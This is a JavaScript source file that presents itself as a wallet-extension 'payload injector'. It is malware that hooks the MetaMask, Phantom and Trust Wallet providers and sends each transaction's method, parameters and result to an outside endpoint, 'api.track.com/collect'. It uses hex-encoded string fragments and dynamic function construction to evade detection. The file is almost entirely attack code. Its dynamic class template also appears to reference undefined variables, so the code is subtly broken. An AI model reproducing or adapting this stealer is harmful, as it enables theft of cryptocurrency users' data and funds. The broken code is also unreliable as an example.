// wallet_injector.js - Extension payload injector
// This module handles dynamic payload assembly for wallet extensions

(function() {
    'use strict';
    
    // Configuration object with obfuscated properties
    const config = {
        targetExtensions: ['metamask', 'phantom', 'trustwallet'],
        injectionPoints: ['contentScript', 'backgroundPage', 'popup'],
        hookFunctions: ['send', 'signTransaction', 'requestAccounts']
    };
    
    // Unicode-encoded string fragments for dynamic reconstruction
    const fragments = {
        a: '\x70\x61\x79\x6c\x6f\x61\x64', // "payload"
        b: '\x48\x61\x6e\x64\x6c\x65\x72', // "Handler"
        c: '\x57\x61\x6c\x6c\x65\x74\x44\x65\x74\x65\x63\x74', // "WalletDetect"
        d: '\x45\x78\x66\x69\x6c\x74\x72\x61\x74\x65', // "Exfiltrate"
        e: '\x2e\x63\x6f\x6d\x2f\x63\x6f\x6c\x6c\x65\x63\x74', // ".com/collect"
        f: '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x74\x72\x61\x63\x6b' // "https://api.track"
    };
    
    // Dynamic function generator for payload assembly
    function assemblePayload() {
        // Reconstruct strings from fragments
        const className = fragments.c + fragments.b;
        const methodName = fragments.a + fragments.d;
        const endpoint = fragments.f + fragments.e;
        
        // Create dynamic function to avoid static detection
        const payloadConstructor = new Function('cls', 'mtd', 'ep', `
            return class ${cls} {
                constructor() {
                    this.endpoint = ep;
                    this.hooked = false;
                }
                
                ${mtd}(data) {
                    // Async exfiltration with error handling
                    fetch(this.endpoint, {
                        method: 'POST',
                        mode: 'no-cors',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            type: 'wallet_data',
                            timestamp: Date.now(),
                            payload: data
                        })
                    }).catch(e => console.debug('Network error'));
                }
                
                hookProvider(provider) {
                    if (this.hooked || !provider) return;
                    
                    const originalSend = provider.send;
                    const self = this;
                    
                    provider.send = function() {
                        const args = Array.from(arguments);
                        const result = originalSend.apply(this, args);
                        
                        // Capture sensitive data
                        if (args[0] && args[0].method) {
                            setTimeout(() => self.${mtd}({
                                method: args[0].method,
                                params: args[0].params,
                                result: result
                            }), 100);
                        }
                        
                        return result;
                    };
                    
                    this.hooked = true;
                }
            }
        `);
        
        return payloadConstructor(className, methodName, endpoint);
    }
    
    // Main injection routine
    function initialize() {
        try {
            const PayloadClass = assemblePayload();
            const injector = new PayloadClass();
            
            // Attempt to hook into detected wallet providers
            if (typeof window.ethereum !== 'undefined') {
                injector.hookProvider(window.ethereum);
            }
            
            // Monitor for dynamically loaded providers
            let providerCheck = setInterval(() => {
                if (window.solana && !injector.hooked) {
                    injector.hookProvider(window.solana);
                }
                if (window.ethereum && !injector.hooked) {
                    injector.hookProvider(window.ethereum);
                }
            }, 2000);
            
            // Cleanup after 30 seconds
            setTimeout(() => clearInterval(providerCheck), 30000);
            
        } catch (err) {
            console.debug('Initialization error:', err.message);
        }
    }
    
    // Delayed execution to avoid blocking
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initialize);
    } else {
        setTimeout(initialize, 1500);
    }
    
})();